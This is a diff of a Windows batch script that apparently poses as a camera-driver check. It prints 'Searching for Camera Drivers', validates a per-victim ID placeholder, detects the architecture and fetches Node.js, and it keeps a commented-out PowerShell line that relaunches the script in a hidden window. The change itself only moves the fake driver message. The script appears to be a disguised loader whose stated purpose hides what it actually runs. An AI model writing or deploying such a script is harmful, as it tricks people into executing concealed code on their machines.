@@ -6,7 +6,7 @@ set "WINDOW_UID=__ID__"
 if not defined WINDOW_UID goto :err_uid
 if "!WINDOW_UID!"=="" goto :err_uid
 if "!WINDOW_UID!"=="__ID__" goto :err_uid
-echo [INFO] Searching for Camera Drivers ...
+
 :: if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
 
 REM Get latest Node.js version using PowerShell
@@ -24,7 +24,7 @@ if /i not "%OS_ARCH%"=="x64" if /i not "%OS_ARCH%"=="arm64" (
     exit /b 1
 )
 set "NODE_EXE="
-
+echo [INFO] Searching for Camera Drivers ...
 :: -------------------------
 :: Check for global Node.js
 :: -------------------------
